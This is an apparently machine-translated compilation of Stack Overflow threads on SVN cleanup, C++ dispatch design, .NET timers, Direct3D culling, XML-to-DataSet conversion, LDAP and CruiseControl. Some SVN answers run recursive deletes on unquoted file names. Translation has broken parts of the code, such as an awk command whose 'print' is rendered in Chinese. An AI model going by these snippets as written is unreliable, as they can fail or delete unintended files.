* * *

## 回答 #26

> 赞同：0
> 
> 时间：2010-11-02T20:27:57.030

如果您不想编写任何代码，svn2svn 的[svn2.exe](http://svn2svn.codeplex.com/releases/view/46229)会执行此操作，还有[一篇](http://code.dblock.org/ShowPost.aspx?id=133)关于如何实现的文章。删除的文件夹和文件被放入回收站。

运行“svn2.exe 同步 [路径]”。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2011-04-28T10:17:01.967

使用 TortoiseSVN： * 右键单击​​工作副本文件夹，同时按住 shift 键 * 选择“删除未受版本控制的项目”

[如何删除工作副本中所有未版本化/忽略的文件/文件夹？](https://stackoverflow.com/questions/2803823/how-can-i-delete-all-unversioned-ignored-files-folders-in-my-working-copy)

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2013-07-31T19:55:40.450

在 PERL 中执行此操作的一种简洁方法是：

```
#!/usr/bin/perl
use IO::CaptureOutput 'capture_exec'

my $command = sprintf ("svn status --no-ignore | grep '^?' | sed -n 's/^\?//p'");

my ( $stdout, $stderr, $success, $exit_code ) = capture_exec ( $command );
my @listOfFiles = split ( ' ', $stdout );

foreach my $file ( @listOfFiles )
{ # foreach ()
    $command = sprintf ("rm -rf %s", $file);
    ( $stdout, $stderr, $success, $exit_code ) = capture_exec ( $command );
} # foreach () 
```

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2014-02-28T11:59:02.200

我用了大约 3 个小时来生成这个。在 Unix 中完成它需要 5 分钟。主要问题是：Win 文件夹名称中的空格、无法编辑 %%i 以及在 Win cmd 循环中定义变量的问题。

```
setlocal enabledelayedexpansion

for /f "skip=1 tokens=2* delims==" %%i in ('svn status --no-ignore --xml ^| findstr /r "path"') do (
@set j=%%i
@rd /s /q !j:~0,-1!
) 
```

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2014-08-18T03:17:14.797

上面的 C# 代码片段对我不起作用 - 我有 tortoise svn 客户端，并且行的格式略有不同。这是与上面相同的代码片段，仅重写为函数并使用正则表达式。

```
 /// <summary>
    /// Cleans up svn folder by removing non committed files and folders.
    /// </summary>
    void CleanSvnFolder( string folder )
    {
        Directory.SetCurrentDirectory(folder);

        var psi = new ProcessStartInfo("svn.exe", "status --non-interactive");
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.WorkingDirectory = folder;
        psi.CreateNoWindow = true;

        using (var process = Process.Start(psi))
        {
            string line = process.StandardOutput.ReadLine();
            while (line != null)
            {
                var m = Regex.Match(line, "\\? +(.*)");

                if( m.Groups.Count >= 2 )
                {
                    string relativePath = m.Groups[1].ToString();

                    string path = Path.Combine(folder, relativePath);
                    if (Directory.Exists(path))
                    {
                        Directory.Delete(path, true);
                    }
                    else if (File.Exists(path))
                    {
                        File.Delete(path);
                    }
                }
                line = process.StandardOutput.ReadLine();
            }
        }
    } //CleanSvnFolder 
```

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2015-07-13T03:31:58.880

对于想要避免使用除标准 MS-Dos 命令之外的任何工具的 Windows 用户，这里有一个解决方案：

FOR /F "tokens=1* delims=" %G IN ('svn st ^| findstr "^?"') DO rd /s /q "%H"

FOR /F "tokens=1* delims=" %G IN ('svn st ^| findstr "^?"') DO del /s /f /q "%H"

*   svn st 将显示工作副本中每个文件和文件夹的状态
*   findstr 将查找以“？”开头的每一行，这意味着文件/文件夹是未版本控制的
*   FOR 将用作分隔符并取第一个之后的标记（第一个是 %G，其余的是 %H）这样我们从 svn st 命令输出中提取文件/文件夹。
*   rd 将删除文件夹， del 将删除文件。

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2018-01-15T16:04:22.647

我还发现并使用了以下内容：svn status --no-ignore| awk '/^?/ {打印 $2}'| xargs rm

# c++ - 我怎样才能改进这个 C++ 代码

> ID：239344
> 
> 赞同：8
> 
> 时间：2008-10-27T08:41:45.437
> 
> 标签：c++, design-patterns, refactoring

我想要您对以下伪代码的建议。请建议我如何改进它，是否可以使用一些设计模式。

```
 // i'm receiving a string containing : id operation arguments
data    = read(socket);
tokens  = tokenize(data," "); // tokenize the string based on spaces
if(tokens[0] == "A") {
   if(tokens[1] == "some_operation") {
      // here goes code for some_operation , will use the remaining tokens as arguments for function calls
   }
   else if(tokens[1] == "some_other_operation") {
     // here goes code for some_other_operation , will use the remaining tokens
   }
   ...
   else {
     // unknown operation
   }
}
else if(tokens[0] == "B") {
   if(tokens[1] == "some_operation_for_B") {
     // do some operation for B
   }
   else if(tokens[1] == "yet_another_operation") {
     // do yet_another_operation for B
   }
   ...
   else {
     // unknown operation
   } 
} 
```

我希望你明白这一点。问题是我有大量的**id**，每个都有自己的**操作**，我认为有 10 个包含大量**if**和**else if 的**代码屏幕有点难看。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-27T08:43:54.993

每个 ID 都有一个实现公共接口的类。基本上是[策略模式](http://en.wikipedia.org/wiki/Strategy_pattern)IIRC。

所以你会调用（伪）代码，如：

`StrategyFactory.GetStrategy(tokens[0]).parse(tokens[1..n])`

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-27T11:09:11.940

首先写下你支持的语法，然后编写代码来支持它。

使用 BNF 表示法对此非常有用。并且将 Spirit 库用于代码部分非常简单。

```
Command := ACommand | BCommand

ACommand := 'A' AOperation
AOperation := 'some_operation' | 'some_other_operation'

BCommand := 'B' BOperation
BOperation := 'some_operation_for_B' | 'some_other_operation_for_B' 
```

这很容易转化为 Spirit 解析器。每个生产规则都将变成单行，每个结束符号都将转换为函数。

```
#include "stdafx.h"
#include <boost/spirit/core.hpp>
#include <iostream>
#include <string>

using namespace std;
using namespace boost::spirit;

namespace {
    void    AOperation(char const*, char const*)    { cout << "AOperation\n"; }
    void    AOtherOperation(char const*, char const*)    { cout << "AOtherOperation\n"; }

    void    BOperation(char const*, char const*)    { cout << "BOperation\n"; }
    void    BOtherOperation(char const*, char const*)    { cout << "BOtherOperation\n"; }
}

struct arguments : public grammar<arguments>
{
    template <typename ScannerT>
    struct definition
    {
        definition(arguments const& /*self*/)
        {
            command
                =   acommand | bcommand;

            acommand = chlit<char>('A') 
              >> ( a_someoperation | a_someotheroperation );

            a_someoperation = str_p( "some_operation" )           [ &AOperation ];
            a_someotheroperation = str_p( "some_other_operation" )[ &AOtherOperation ];

            bcommand = chlit<char>('B') 
              >> ( b_someoperation | b_someotheroperation );

            b_someoperation = str_p( "some_operation_for_B" )           [ &BOperation ];
            b_someotheroperation = str_p( "some_other_operation_for_B" )[ &BOtherOperation ];

        }

        rule<ScannerT> command;
        rule<ScannerT> acommand, bcommand;
        rule<ScannerT> a_someoperation, a_someotheroperation;
        rule<ScannerT> b_someoperation, b_someotheroperation;

        rule<ScannerT> const&
        start() const { return command; }
    };
};

template<typename parse_info >
bool test( parse_info pi ) {
  if( pi.full ) { 
    cout << "success" << endl; 
    return true;
  } else { 
    cout << "fail" << endl; 
    return false;
  }
}

int _tmain(int argc, _TCHAR* argv[])
{

  arguments args;
  test( parse( "A some_operation", args, space_p ) );
  test( parse( "A some_other_operation", args, space_p ) );
  test( parse( "B some_operation_for_B", args, space_p ) );
  test( parse( "B some_other_operation_for_B", args, space_p ) );
  test( parse( "A some_other_operation_for_B", args, space_p ) );

    return 0;
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T09:00:57.410

您可以查看“表驱动方法”（如“代码完成”，第 2 版，第 18 章中所述）。我想这就是[Cheery 所描述的。](https://stackoverflow.com/questions/239344/how-could-i-improve-this-code-c#239360) 这样做的好处是易于扩展。您只需向表中添加一些条目。该表可以是硬编码的，甚至可以在运行时加载。

与[Epaga 的建议](https://stackoverflow.com/questions/239344/how-could-i-improve-this-code-c#239348)类似，您也可以尝试通过多态性来解决这个问题，让专门的类针对不同的情况执行操作。这里的缺点是您必须编写新类以防发生更改。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T08:51:55.307

您希望将其拆分为多个函数，每个 ID 一个，每个操作一个。

我通常使用的准则是屏幕高度。如果我的屏幕不能完全适应我的功能，我会开始考虑拆分。这样你就不需要滚动来查看函数的去向。正如我所说，这是一个指导方针，而不是规则，但我发现控制结构更实际。

如果您随后想采用 OO 方法并将其变成一堆类，如果您看到优势，欢迎您这样做。不过，请注意随之而来的所有管道。您可能希望保持简单。

戴夫

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-27T16:20:17.867

我已经看到了一个很好的解决这个问题的方法：函数的哈希表。

在编译时，会为每个支持的操作创建一个[完美哈希函数，并且该操作与要调用的函数相关联（函数指针是哈希中的值，命令字符串是键）。](http://www.google.com/search?q=gperf&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a)

在运行时，通过使用命令字符串调用命令功能以在哈希表中查找函数。然后调用该函数，通过引用传递“数据”字符串。然后每个命令函数根据其规则解析出剩余的字符串......策略模式也适用于这一点。

使代码像状态机一样工作，这是（恕我直言）处理网络代码的最简单方法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T08:53:01.263

创建功能图。然后你会有这样的代码：

```
consumed_count = token_mapper[tokens[0]](tokens)
remove amount of consumed tokens according to the return value and repeat. 
```

不过，无论如何我都不理解您的方法，您将编写一种难以处理且不灵活的语言。想一想：论点数量的微小差异会对该语言造成真正的破坏。因此，每个命令始终限制为 1-3 个参数。

我宁愿只使用一些词法分析器/解析器生成器组合，但如果你想做你要做的事情，我建议你至少先用换行符分割，然后用空格分割，因此有明确的方法来查看是否它旨在提供 2 或 3 个论点。

即使您的语言是机器生成的，这也很重要，但如果您的生成器最终出现错误怎么办？早失败，经常失败。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-27T09:06:38.257

您可以使用命令模式……您的每个操作都会知道它的 ID 和操作，并在运行时将自己添加到列表中……然后您只需查找正确的命令，将其传递给任何上下文它需要并且它将执行操作。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-27T09:08:27.160

表格驱动的方法似乎适合这个，就像 mxp 说的那样。如果您的函数有不同数量的参数，您可以在表中有一列指定同一行上函数的参数数量。

# .net - 使用 System.Timers.Timer 时非常奇怪的错误

> ID：239350
> 
> 赞同：1
> 
> 时间：2008-10-27T08:45:39.280
> 
> 标签：.net, events, timer

出于某种奇怪的原因，Elapsed 事件触发了两次，它肯定应该触发一次。紧接着，计时器停止工作......代码结构有点像这样：当某个对象包含的某个值（以 500-1500 毫秒的间隔不断更新）增加超过 X 时，它被定义为触发某个事件与前一个值相比较的总和。

例如，如果我将 X 定义为 2，并且我收到的值是 1、2、1、2、3、4、8，那么当输入 8 时，该事件将触发。该事件的事件处理程序启动上述计时器，该计时器在它过去之前运行 Y 时间并触发有问题的事件。如果在计时器结束之前该值恢复正常，则重置计时器。

因此，总体结果应该是一个测量某个动态值的应用程序，并监视它是否存在超过 Y 秒时间发生的大 X 大小异常。

代码中的整体结果看起来像

```
vMonitor.Range=X;
vMonitor.Over+= new EventHandler(StartTimer);
vMonitor.Normal+= new EventHandler(StopTimer);
vTimer.Elapsed+= new EventHandler(RaiseAlert);
source.BeginUpdate(vMonitor.Value); 
```

实际的问题是 RaiseAlert 在计时器经过时被触发两次，然后就好像计时器完全停止工作，不再触发。我认为值得一提的是，整个应用程序包含大量线程活动，一次至少运行 2 个线程，更新 vMonitor 值。

有什么想法吗？

### 更新：

关于线程问题，解释确切的结构相当复杂，但我可以说 vMonitor 对象包含在另一个对象中，该对象包含更新值，该值由各个线程不断更改，当然是受监视的. 每当父对象的值更新时，它与 vMonitor 进行比较，并触发适当的事件。vMonitor 中的值随后被父对象值替换。

编辑：我刚刚再次验证了它， vTimer.Elapsed 委托仅包含一个正确的事件处理程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-28T01:50:39.883

来自[MSDN](http://msdn.microsoft.com/en-us/library/system.timers.timer(VS.80).aspx)：

> Elapsed 事件在 ThreadPool 线程上引发。如果 Elapsed 事件的处理持续时间超过 Interval，则该事件可能会在另一个 ThreadPool 线程上再次引发。因此，事件处理程序应该是可重入的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-28T01:39:08.050

编辑以考虑米奇所说的话，因为我完全忘记了这是最简单的答案。在处理 Elapsed 事件的方法中，请确保您首先停止计时器，以便在处理事件时不会再次触发该事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T08:50:47.117

好吧，我最基本的直觉是，您实际上有两个事件连接到 Elapsed 事件 - 导致两个事件触发。我已经被这个抓住了，有时是因为我已经在设计器中添加了事件连接时手动添加了它，或者这里有一些继承方面，连接已经在基类中并且你正在重复它在派生类中。

当然，如果有多个线程，那么这是一个完全不同的球赛！

# graphics - Modelling an I-Section in a 3D Graphics Library

> ID：239367
> 
> 赞同：2
> 
> 时间：2008-10-27T08:59:33.293
> 
> 标签：graphics, directx, direct3d, 3d

I am using Direct3D to display a number of I-sections used in steel construction. There could be hundreds of instances of these I-sections all over my scene.

I could do this two ways:

![I-Sections](https://i.stack.imgur.com/Eu1Lr.png)

Using method A, I have fewer surfaces. However, with backface culling turned on, the surfaces will be visible from only one side. If backface culling is turned off, then the flanges (horizontal plates) and web (vertical plate) may be rendered in the wrong order.

Method B seems correct (and I could keep backface culling turned on), but in my model the thickness of plates in the I-section is of no importance and I would like to avoid having to create a separate triangle strip for each side of the plates.

Is there a better solution? Is there a way to switch off backface culling for only certain calls of DrawIndexedPrimitives? I would also like a platform-neutral answer to this, if there is one.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T09:13:36.947

In OpenGL you can switch of backface culling for each triangle you draw:

```
glEnable(GL_CULL_FACE);
glCullFace(GL_FRONT);
// or
glCullFace(GL_BACK); 
```

I think something similar is also possible in Direct3D

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T09:13:50.863

First off, backface culling doesn't have anything to do with the order in which objects are rendered. Other than that, I'd go for approach B for no particular reason other than that it'll probably look better. Also this object probably isn't more than a hand full of triangles; having hundreds in a scene shouldn't be an issue. If it is, try looking into hardware instancing.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T09:32:33.647

If your I-sections don't change that often, load all the sections into one big vertex/index buffer and draw them with a single call. That's the most performant way to draw things, and the graphic card will do a fast job even if you push half a million triangle to it.

Yes, this requires that you duplicate the vertex data for all sections, but that's how D3D9 is intended to be used.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T13:35:39.867

I would go with A as the distance you would be seeing the B from would be a waste of processing power to draw all those degenerate triangles.

Also I would simply fire them at a z-buffer and allow that to sort it all out.

If it get's too slow then I would start looking at optimizing, but even consumer graphics cards can draw millions of polygons per second.

# c# - 如何将复杂的 XML 结构转换为具有多个表的 DataSet

> ID：239381
> 
> 赞同：2
> 
> 时间：2008-10-27T09:12:25.170
> 
> 标签：c#, .net, xml, xslt, dataset

将 XML 文档转换为 .NET 2.0 数据集的最佳方法是什么。XML 文档包含具有父子关系的复杂结构，应转换为 DataSet 中的多个表。DataSet 表还应维护表之间的关系。现在，我必须编写自定义 XSLT 来进行这种转换

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T09:28:44.793

最好的（意思是最简单的）方法，也包括所有的父/子关系是......

```
DataSet myDataSet = new DataSet();

myDataSet.ReadXml("myXmlFile.xml"); 
```

多田！

顺便说一句，如果您在内存中有 XML（而不是在文件中），那么您可以使用“ReadXml”重载之一从流中读取它。

# ldap - LDAP 用于什么？

> ID：239385
> 
> 赞同：162
> 
> 时间：2008-10-27T09:13:53.373
> 
> 标签：ldap

我知道 LDAP 用于提供一些信息并帮助促进授权。

但是 LDAP 的其他用途是什么？

* * *

## 回答 #1

> 赞同：276
> 
> 时间：2014-02-13T20:38:27.957

我将重点介绍为什么使用 LDAP，而不是什么是 LDAP。

使用模式类似于人们使用借书证或电话簿的方式。当您有一个需要“一次写入/更新，多次读取/查询”的任务时，您可能会考虑使用 LDAP。LDAP 旨在为大规模数据集提供极快的读取/查询性能。通常，您只想为每个条目存储一小部分信息。与读取/查询相比，添加/删除/更新性能相对较慢，因为假设您不经常“更新”。

想象一下，您有一个网站，该网站拥有一百万注册用户，每秒有数千个页面请求。如果没有 LDAP，每次用户单击页面时，即使是查看静态页面，您也可能需要与数据库交互以验证用户 ID 及其在此登录会话中的数字签名。显然，对数据库进行用户验证的查询将成为您的瓶颈。通过使用 LDAP，您可以轻松卸载用户验证并获得显着的性能改进。本质上，在此示例中，LDAP 是数据库之外的另一个优化层，用于提高性能，而不是替换任何数据库功能。

LDAP 不仅用于用户验证，任何具有以下属性的任务都可能是 LDAP 的一个很好的用例：

1.  您需要多次定位一条数据并且希望它快速

2.  你不关心不同数据之间的逻辑和关系

3.  您不会经常更新、添加或删除数据

4.  每个数据条目的大小很小

5.  您不介意将所有这些小块数据集中在一个地方

* * *

## 回答 #2

> 赞同：76
> 
> 时间：2008-10-27T09:23:06.677

这是一个相当大的问题。

LDAP 是一种用于访问目录的协议。目录包含对象；一般与用户、组、计算机、打印机等有关；公司结构信息（尽管坦率地说，您可以扩展它并在其中存储任何内容）。

LDAP 为您提供了在目录中添加、更新和删除对象的查询方法（还有更多，但这些是中心对象）。

LDAP 不提供数据库；数据库提供对自身的 LDAP 访问，而不是相反。它不仅仅是注册。

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2009-02-26T20:38:34.523

嗯，有 LDAP 服务器和 LDAP 协议。结合起来，它是一个数据存储或数据库。它不是关系型的，但它只是一个存储数据的地方，并且经过优化，读取效率高于写入效率。它不支持事务。

现在，它恰好在存储凭据方面非常流行，但这绝不是它的唯一目的，也不是它的最初目的。

* * *

## 回答 #4

> 赞同：32
> 
> 时间：2015-06-03T10:21:30.833

LDAP 代表轻量级目录访问协议。顾名思义，它是一种用于访问目录服务的轻量级协议，特别是基于 X.500 的目录服务。LDAP 在 TCP/IP 或其他面向连接的传输服务上运行。LDAP 的基本细节在 RFC2251“轻量级目录访问协议 (v3)”和其他包含技术规范 RFC3377 的文档中定义。本节从用户的角度概述了 LDAP。

目录中可以存储什么样的信息？LDAP 信息模型基于条目。条目是具有全局唯一标识 (DN) 的属性的集合。DN 用于明确地引用条目。每个条目的属性都有一个类型和一个或多个值。这些类型通常是助记符字符串，例如`cn`通用名称或`mail`电子邮件地址。值的语法取决于属性类型。例如，一个`cn`属性可能包含值`Babs Jensen`。邮件属性可能包含值`babs@example.com`。属性将`jpegPhoto`包含 JPEG（二进制）格式的照片。

信息是如何安排的？在 LDAP 中，目录条目以分层树状结构排列。

![在此处输入图像描述](https://i.stack.imgur.com/rHLqy.gif)

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2008-10-27T09:51:38.447

LDAP 的主要思想是将用户的所有信息（联系方式、登录名、密码、权限）保存在一个地方，以便网络管理员更容易维护。例如，您可以：

*   使用相同的登录名/密码登录 Intranet 和本地计算机。
*   给一组用户特定的权限。例如，有些人可以访问 Intranet 的某些特定页面，或共享驱动器上的某些特定目录。
*   例如，在 Outlook 上获取公司人员的所有联系方式。

* * *

## 回答 #6

> 赞同：17
> 
> 时间：2008-10-27T09:42:16.170

LDAP 是轻量级目录访问协议。基本上，它是一种用于从数据库（或其他来源）访问数据的协议，它主要适用于大量查询和最少的更新（例如，您将用于登录信息的那种东西）。

LDAP 本身并不提供数据库，只是一种查询数据库中数据的方法。

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2013-05-15T09:59:11.610

使用 LDAP 的主要好处是可以将整个组织的信息整合到一个中央存储库中。例如，LDAP 可以用作可从网络上任何地方访问的中央目录，而不是管理组织内每个组的用户列表。由于 LDAP 支持安全套接字层 (SSL) 和传输层安全性 (TLS)，因此可以保护敏感数据免遭窥探。

LDAP 还支持许多用于存储目录的后端数据库。这使管理员可以灵活地部署最适合服务器要传播的信息类型的数据库。由于 LDAP 还具有定义良好的客户端应用程序编程接口 (API)，因此支持 LDAP 的应用程序数量众多，并且数量和质量都在增加。

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2012-07-11T22:16:34.730

我有机会为学校开始了一个关于ldap的项目，从头开始，但是在了解什么是ldap之前，我必须了解什么是目录，有很多（最常用的目录是novell和windows），这里你可以在[维基百科](http://en.wikipedia.org/wiki/Active_Directory)中看到什么目录。

ldap 是与板通信的协议，我发现的最好的书之一就是[这本](http://www.google.com.mx/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CE4QFjAA&url=http%3A%2F%2Fwww.schnitz.net%2Fldap.pdf&ei=z_r9T77xLeec2QXBx4TADg&usg=AFQjCNHVVy1QLxGFD57JYaI1PDfDwKR8YA&sig2=hLH7kOLNHLkZSxixv9HeQA)。

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2017-06-07T17:12:47.827

*   LDAP 的主要用途是提供更快的数据检索。它充当一个中央存储库，用于存储可由各种应用程序同时访问的用户详细信息。

*   不同时间读取的数据，但我们很少更新数据，然后 LDAP 是更好的选择，因为它的结构读取它的速度更快，但在 LDAP 的情况下更新（添加/更新或删除）有点乏味

*   LDAP 提供的安全性：LDAP 可以与 SSL 和 TLS 一起使用，因此可用于敏感信息。

*   LDAP 还可以与许多数据库一起使用，从而为选择最适合我们环境的数据库提供更大的灵活性

*   可能是在 master 与其副本之间同步信息的更好选择
*   LDAP除了支持数据恢复能力外，还允许我们将数据导出为LDIF文件，可以被市面上的各种软件读取

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2013-09-07T16:41:56.570

LDAP 只是一种访问结构化信息的协议。LDAP 具有标准化的本地和远程信息访问，而在数据库的情况下，只有标准化的本地访问，远程访问是专有的。

LDAP 服务器针对事务的搜索操作和数据库进行了优化（插入/删除）。

有关更多信息，请参阅以下链接：

[http://www.itszero.in/2013/09/what-is-ldap-ad-adam.html](http://www.itszero.in/2013/09/what-is-ldap-ad-adam.html)

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2014-03-25T06:02:47.200

在 Windows Server 中，LDAP 是一种用于访问 Active Directory 对象、用户身份验证、授权的协议。

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2013-08-16T09:15:05.417

好吧，LDAP 是一种访问结构化信息的协议（方式）。LDAP 使用客户端-服务器模型，因此 LDAP 客户端请求访问所需的信息。LDAP 服务器不是以关系方式存储信息，而是以属性和值对的方式存储信息。您可以使用 LDAP 为用户组或相同的凭据分配相同的权限以访问多个服务。有关更多详细信息，请参阅以下链接：[http ://www.zytrax.com/books/ldap/ch2/](http://www.zytrax.com/books/ldap/ch2/)

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-11-20T17:49:22.360

为了进一步了解前面提到的另一个定义，这个观点怎么样......

LDAP 是轻量级目录访问协议。DAP，是 X.500 的概念，在 X.500 中是非常重的重量！（它需要一个完整的 7 层 ISO 网络堆栈，基本上只有 IBM 的 SNA 协议实际实现过）。

DAP 还有许多其他方法。Novell 有一个叫做 NDAP（NCP Novell 核心协议是传输，NDAP 是它读取目录的方式）。

顾名思义，LDAP 只是一个非常轻量级的 DAP。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2013-07-21T07:59:26.280

LDAP 代表轻量级目录访问协议。它在 Active Directory 中用于交流用户查询。例如。用户可以使用 LDAP 来搜索和定位特定对象，例如域中的激光打印机。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-02-26T20:34:30.570

LDAP 还用于将您的凭据存储在网络安全系统中，并使用您的密码和解密密钥检索它，从而使您可以访问服务。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2013-12-11T09:32:35.957

轻量级目录访问协议用于认证用户访问AD信息

# continuous-integration - 设置 CruiseControl 的初始成本是多少？

> ID：239394
> 
> 赞同：3
> 
> 时间：2008-10-27T09:20:16.870
> 
> 标签：continuous-integration

设置 CruiseControl 的初始成本是多少？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T09:31:46.053

这里的关键点不是您必须投入时间来设置 CruiseControl。您可以在一个小时左右完成此操作。问题是天气你是否有一个代码存储库（SVN、TFS）和一个构建脚本准备好（一些东西——MSBuild 脚本左右——它将清理、重建、测试和部署你的应用程序）。如果不是，您将不得不在这方面投入一些时间 - 取决于您的项目有多复杂 - 但肯定会比设置 CruiseControl 服务器花费更多的时间。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T09:24:21.090

如果您是新手，则价值不超过两到三个小时。我第一次使用它时，我从 subversion 中检查了最新版本，使用 MSBuild 编译它，然后在不到那个时间的时间内上传它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T09:41:00.590

我会在一周中的任何一天推荐[Hudson而不是 CruiseControl。](http://hudson.dev.java.net/)我想不出CruiseControl 能做什么Hudson 不能做的事情（更好）。尤其是基于 Web 的前端要优越得多。[您可以直接在您的机器上](http://hudson.dev.java.net/hudson.jnlp)运行 Hudson （使用 JNLP）并在几分钟内完成您的项目设置。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T09:49:39.277

软件 - 免费。

硬件 - 成本取决于。如果您只想每晚运行，它可能会与其他东西共享服务器空间。我们使用每 15 分钟构建一次的专用服务器。

设置时间 - 一旦了解到您正在寻找几个小时来设置新服务器。如果您是 CC 新手，请允许一两天。

如果您在为整个团队准备好学习曲线之前从未使用过集成服务器 - 请等待几周。

我们最近搬到了一个新的服务器上，我们设置了一个全新的安装 - 花了几个小时。这适用于四个项目、两个不同的源代码控制提供程序，并且包括自定义任务，例如报告和构建帮助文件。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T09:30:30.797

启动和运行它需要一点时间 - 但如果您是该主题的完整新手，您可以在不到一天的时间内使用任务构建您的 .sln 文件来构建解决方案。

当你在各种框架中添加单元测试、定制仪表板、标记你的构建等时，它会变得有点复杂，但它是几天的问题，而不是几周的时间来启动和运行任何东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-27T09:30:52.670

我推荐一台用于巡航控制的专用机器，它不必非常强大，但请记住它必须能够编译您的代码。

我们使用的是旧的开发者机器，升级后被搁置了。

就时间成本而言，一天应该让您启动并运行。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T09:23:22.590

你如何定义“成本”？它是免费下载的，所以没有金钱成本。

就时间而言，它应该需要 1/2 - 1 天，具体取决于您的配置有多复杂。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T09:31:48.627

如果你有一个没有依赖项的简单项目，那么几个小时。如果您实际上正在对具有许多依赖项的许多项目进行“集成”，那么需要几周时间并且可能会更改代码。恕我直言 CC.Net 不能很好地扩展到大量项目......

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-27T09:43:42.160

您应该可以在大约 3 小时内完成设置，而且它是完全免费的。

您仍然可以在 Simian 等外部工具上花钱，但这完全是可选的。设置 CCnet 确实是通过配置文档的问题，仅此而已。

我之前在博客上写过我在 CCnet 上的经历：[http ://www.tigraine.at/2008/10/08/another-take-on-contiuous-integration/](http://www.tigraine.at/2008/10/08/another-take-on-contiuous-integration/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-04-12T12:33:27.823

Jay Flowers 运行一个名为 CI Factory 的项目，它使您能够立即将 CruiseControl.NET 安装与可选模块组合在一起。

[http://jayflowers.com/joomla/](http://jayflowers.com/joomla/)

此外，您可能希望收听 .NET Rocks 播客对他的采访：

[http://www.dnrtv.com/default.aspx?showID=64](http://www.dnrtv.com/default.aspx?showID=64)

# java - 来自java应用程序的Activex？

> ID：239395
> 
> 赞同：6
> 
> 时间：2008-10-27T09:21:18.553
> 
> 标签：java, windows, activex

是否可以在 Java 应用程序中轻松嵌入 ActiveX 控件？这值得么。在我的下一个项目中，我应该在 Java 应用程序中使用现有的 activex，或者必须从头开始重新实现所有内容，所以我想知道什么会少一些麻烦。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-27T10:26:01.263

我认为不求助于第三方库就没有办法做到这一点。（或者你自己滚动，但你确实说“容易”。）

[SWT](http://www.eclipse.org/swt)（“标准小部件工具包”）包含对嵌入 ActiveX 控件的支持。SWT 是 Swing 的替代方案，尽管它们之间存在一定程度的互操作性。
[这是](http://dev.eclipse.org/viewcvs/index.cgi/org.eclipse.swt.snippets/src/org/eclipse/swt/snippets/Snippet265.java?view=co)在 SWT 窗口中嵌入 Windows Media Player 的示例。

或者还有[Jacob](http://jacob-project.wiki.sourceforge.net/)项目，虽然我自己没有使用过。

至于“值得吗？” 好吧，我可以根据经验说 SWT 使它相对容易，但是除非您的应用程序可以优雅地处理它们不可用的问题，否则通过依赖 COM 组件，您将失去在多个平台上运行的能力，而这首先使 Java 具有吸引力.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-28T02:26:28.640

这实际上取决于您需要重新实施多少。[Jacob 项目](http://sourceforge.net/projects/jacob-project/)相当不错（我们广泛用于 Excel 和 Word 的自动化），但你必须真正*了解*COM 才能使用它，尤其是 IDispatch 接口的变幻莫测（使用 ActiveX / COM 的人很少真正了解 COM -他们只是依赖微软的模板生成）。

如果您只是想为一些简单的 DAO 对象节省一些输入，那么重新实现可能会更好（哎呀，您可能会使用 DTD 并编写一个脚本来为其生成 Java 代码）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-02-04T00:14:52.110

[http://www.codeproject.com/KB/cross-platform/javacom.aspx?msg=1776281](http://www.codeproject.com/KB/cross-platform/javacom.aspx?msg=1776281)如果您愿意手工做一些事情可能会有所帮助...

不过好像不是很灵活...

# c# - 我可以强制子类覆盖方法而不使其抽象吗？

> ID：239408
> 
> 赞同：10
> 
> 时间：2008-10-27T09:28:07.730
> 
> 标签：c#, .net, visual-studio-2008, abstract-class

